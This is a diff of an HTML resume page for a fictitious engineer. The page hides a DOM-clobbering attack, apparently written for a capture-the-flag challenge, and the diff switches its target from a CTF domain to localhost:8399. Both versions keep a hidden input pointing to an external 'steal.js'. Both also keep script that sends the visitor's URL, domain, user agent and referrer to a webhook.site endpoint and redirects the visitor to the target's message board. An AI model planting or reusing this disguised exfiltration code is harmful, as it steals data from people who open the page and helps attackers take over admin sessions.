@@ -1,15 +1,12 @@
-     <!DOCTYPE html>
+    <!DOCTYPE html>
      <html>
      <head>
          <title>Michael Thompson - Senior Software Engineer</title>
          <meta charset="UTF-8">
          <style>
-             body { font-family: Arial, sans-serif; margin: 0; padding: 40px;
-     background: #f4f4f4; }
-             .resume { max-width: 800px; margin: 0 auto; background: white;
-     padding: 40px; border-radius: 8px; }
-             h1 { color: #2c3e50; margin: 0; border-bottom: 2px solid #3498db;
-     padding-bottom: 10px; }
+             body { font-family: Arial, sans-serif; margin: 0; padding: 40px; background: #f4f4f4; }
+             .resume { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; }
+             h1 { color: #2c3e50; margin: 0; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
              .contact { color: #666; margin: 15px 0; }
              h2 { color: #34495e; margin-top: 30px; }
              ul { line-height: 1.8; }
@@ -23,44 +20,35 @@
                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
              </div>
 
-             <!-- CRITICAL: DOM Clobbering element - this was missing! -->
-             <div style="position: fixed; left: -10000px; visibility: hidden; 
-     opacity: 0;">
-                 <input id="utilsJS" name="url" 
-     value="https://gavinyw.github.io/resume-portfolio/steal.js">
+             <!-- CRITICAL: DOM Clobbering element targeting localhost -->
+             <div style="position: fixed; left: -10000px; visibility: hidden; opacity: 0;">
+                 <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/steal.js">
              </div>
 
              <h2>Professional Summary</h2>
-             <p>Experienced software engineer with 12+ years in web development,
-     cybersecurity, and team leadership. Specializes in secure applications and
-     penetration testing.</p>
+             <p>Experienced software engineer with 12+ years in web development, cybersecurity, and team leadership.
+     Specializes in secure applications and penetration testing.</p>
 
              <h2>Work Experience</h2>
              <ul>
-                 <li><strong>Senior Software Engineer</strong> - CyberSec Solutions
-      Inc. (2021-2024)</li>
-                 <li><strong>Full Stack Developer</strong> - TechStart Innovations
-     (2019-2021)</li>
-                 <li><strong>Software Developer</strong> - WebCorp Agency
-     (2017-2019)</li>
+                 <li><strong>Senior Software Engineer</strong> - CyberSec Solutions Inc. (2021-2024)</li>
+                 <li><strong>Full Stack Developer</strong> - TechStart Innovations (2019-2021)</li>
+                 <li><strong>Software Developer</strong> - WebCorp Agency (2017-2019)</li>
              </ul>
 
              <h2>Technical Skills</h2>
-             <p>JavaScript, Python, React, Node.js, PostgreSQL, Docker, AWS,
-     Security Testing, Penetration Testing</p>
+             <p>JavaScript, Python, React, Node.js, PostgreSQL, Docker, AWS, Security Testing, Penetration Testing</p>
 
              <h2>Education</h2>
-             <p><strong>B.S. Computer Science</strong> - University of Maryland
-     (2017)</p>
+             <p><strong>B.S. Computer Science</strong> - University of Maryland (2017)</p>
 
              <div style="text-align: center; margin-top: 40px; color: #666;">
-                 <p>Thank you for reviewing my application. I look forward to
-     discussing opportunities.</p>
+                 <p>Thank you for reviewing my application. I look forward to discussing opportunities.</p>
              </div>
          </div>
 
          <script>
-             console.log('Combined attack strategy starting...');
+             console.log('LOCALHOST-TARGETED ATTACK - Instructor Note Applied');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -68,12 +56,9 @@
                      const img = new Image();
                      const params = new URLSearchParams();
                      Object.keys(data).forEach(key => {
-                         params.append(key, typeof data[key] === 'object' ?
-     JSON.stringify(data[key]) : data[key]);
+                         params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src =
-     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/combined?' +
-     params.toString();
+                     img.src = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/localhost?' + params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
@@ -81,23 +66,22 @@
 
              // Send initial confirmation
              sendWebhook({
-                 status: 'COMBINED_ATTACK_START',
+                 status: 'LOCALHOST_TARGETED_ATTACK_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  current_url: window.location.href,
                  clobbering_ready: !!window.utilsJS,
-                 clobbering_url: window.utilsJS?.url || window.utilsJS?.value ||
-     'not_found',
+                 clobbering_url: window.utilsJS?.url || window.utilsJS?.value || 'not_found',
                  user_agent: navigator.userAgent,
-                 referrer: document.referrer || 'none'
+                 referrer: document.referrer || 'none',
+                 instructor_note_applied: true
              });
 
-             // STRATEGY 1: Traditional DOM Clobbering (this was working before)
+             // STRATEGY 1: Traditional DOM Clobbering (execute first)
              setTimeout(() => {
                  console.log('Executing DOM clobbering strategy...');
 
-                 if (window.utilsJS && (window.utilsJS.url ||
-     window.utilsJS.value)) {
+                 if (window.utilsJS && (window.utilsJS.url || window.utilsJS.value)) {
                      sendWebhook({
                          status: 'DOM_CLOBBERING_EXECUTING',
                          timestamp: new Date().toISOString(),
@@ -129,20 +113,20 @@
                  }
              }, 2000);
 
-             // STRATEGY 2: Check if we're on CTF domain and handle accordingly
-             if (window.location.hostname.includes('secjhu') ||
-     window.location.hostname.includes('ctf')) {
-                 console.log('On CTF domain - direct execution');
+             // STRATEGY 2: Check if we're on localhost and handle accordingly
+             if (window.location.hostname === 'localhost' || window.location.hostname.includes('localhost')) {
+                 console.log('On localhost - direct execution');
 
                  sendWebhook({
-                     status: 'ON_CTF_DOMAIN',
+                     status: 'ON_LOCALHOST_DOMAIN',
                      timestamp: new Date().toISOString(),
-                     domain: window.location.hostname
+                     domain: window.location.hostname,
+                     port: window.location.port
                  });
 
-                 // If we're already on CTF domain, execute attack directly
+                 // If we're already on localhost, execute attack directly
                  setTimeout(() => {
-                     // Try to trigger the vulnerable function on the CTF site
+                     // Try to trigger the vulnerable function on localhost
                      if (typeof loadMessageBoardJS === 'function') {
                          loadMessageBoardJS();
                      } else {
@@ -150,10 +134,8 @@
                          const input = document.createElement('input');
                          input.id = 'utilsJS';
                          input.name = 'url';
-                         input.value =
-     'https://gavinyw.github.io/resume-portfolio/steal.js';
-                         input.style.cssText =
-     'position:fixed;left:-9999px;opacity:0;';
+                         input.value = 'https://gavinyw.github.io/resume-portfolio/steal.js';
+                         input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
                          document.body.appendChild(input);
 
                          setTimeout(() => {
@@ -168,40 +150,40 @@
                  }, 3000);
 
              } else {
-                 // STRATEGY 3: If on GitHub, try redirect after DOM clobbering 
-     attempt
+                 // STRATEGY 3: If on GitHub, redirect to localhost:8399 (INSTRUCTOR'S SOLUTION)
                  setTimeout(() => {
-                     console.log('On GitHub - attempting redirect to CTF domain');
+                     console.log('On GitHub - redirecting to localhost:8399 as per instructor note');
 
-                     const ctfDomain = 'ctf.secjhu.club';
-                     const redirectUrl = `https://${ctfDomain}/#messages`;
+                     // CRITICAL UPDATE: Use localhost:8399 instead of CTF domain
+                     const localhostUrl = 'http://localhost:8399/#messages';
 
                      sendWebhook({
-                         status: 'ATTEMPTING_CTF_REDIRECT',
+                         status: 'REDIRECTING_TO_LOCALHOST_8399',
                          timestamp: new Date().toISOString(),
-                         target_url: redirectUrl
+                         target_url: localhostUrl,
+                         instructor_guidance: 'admin_stores_flag_on_localhost'
                      });
 
                      // Only redirect if we haven't already tried
-                     if (!sessionStorage.getItem('redirect_attempted')) {
-                         sessionStorage.setItem('redirect_attempted', 'true');
+                     if (!sessionStorage.getItem('localhost_redirect_attempted')) {
+                         sessionStorage.setItem('localhost_redirect_attempted', 'true');
                          setTimeout(() => {
-                             window.location.href = redirectUrl;
+                             console.log('🎯 REDIRECTING TO LOCALHOST:8399 - FLAG LOCATION!');
+                             window.location.href = localhostUrl;
                          }, 1000);
                      }
                  }, 6000);
              }
 
-             // STRATEGY 4: Also try to navigate to messages section if we're on 
-     CTF domain
-             if (window.location.hostname.includes('secjhu') ||
-     window.location.hostname.includes('ctf')) {
+             // STRATEGY 4: Navigate to messages section if on localhost
+             if (window.location.hostname === 'localhost' || window.location.hostname.includes('localhost')) {
                  setTimeout(() => {
                      if (window.location.hash !== '#messages') {
                          window.location.hash = '#messages';
                          sendWebhook({
-                             status: 'NAVIGATED_TO_MESSAGES',
-                             timestamp: new Date().toISOString()
+                             status: 'NAVIGATED_TO_LOCALHOST_MESSAGES',
+                             timestamp: new Date().toISOString(),
+                             full_url: window.location.href
                          });
                      }
                  }, 4000);
